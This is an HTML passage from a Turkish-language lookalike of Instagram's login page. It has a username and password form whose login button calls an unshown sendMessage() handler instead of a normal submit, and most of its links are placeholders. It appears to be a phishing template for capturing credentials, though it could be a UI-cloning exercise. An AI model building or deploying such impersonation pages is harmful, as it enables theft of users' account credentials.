<body>

  <div id="content-container">

    <!--Phone's pictures section-->

      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">

        <img class="picture" src="./img/photo-1.png" alt="#">

      </div>
    </section>

    <!--User's log in section-->
    <section class="user">

      <div class="login-container">

        <!--Instagram Logo-->
        <div class="instagram-logo-box">
          <img class="instagram-logo" src="./img/instagram-logo.png">
        </div>

        <!--Form Login-->
        <form id="login-post" method="POST">
          <div class="inputs-container">
            <input type="text" name="username" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" aria-required="true" maxlength="30" autocapitalize="off" name="username" required>
          </div>
          <div class="inputs-container">
            <input type="password" name="password" id="password" placeholder="Şifre" maxlength="30" aria-required="true" autocapitalize="off" required>
          </div>
          <a class="login-button btn" type="button" name="button" onclick="sendMessage()">Giriş yap</a>

          <div class="or-container">
            <div class="line"></div>
            <div class="or">YA DA</div>
            <div class="line"></div>
          </div>

          <!--Facebook login-->
          <div class="facebook-container">
            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
                src="./img/facebook-logo.png">Facebook ile Giriş Yap</a>
          </div>
        </form>

        <!--Password recovery-->
        <a class="password-forgot" href="#" target="_blank">Şifreni mi unuttun?</a>
      </div>

      <!--Sign up-->
      <div class="signup-container">
        <p>Hesabın yok mu? <a class="signup" href="#" target="_blank">Kaydol</a></p>
      </div>

      <!--App's download-->
      <div class="get-container">
        <p>Uygulamayı indir.</p>
        <div class="download-container">
          <a class="download-appstore" href="#" target="_blank"><img class="appstore"
              src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
              src="./img/googleplay-logo.png"></a>
        </div>
      </div>

    </section>

  </div>
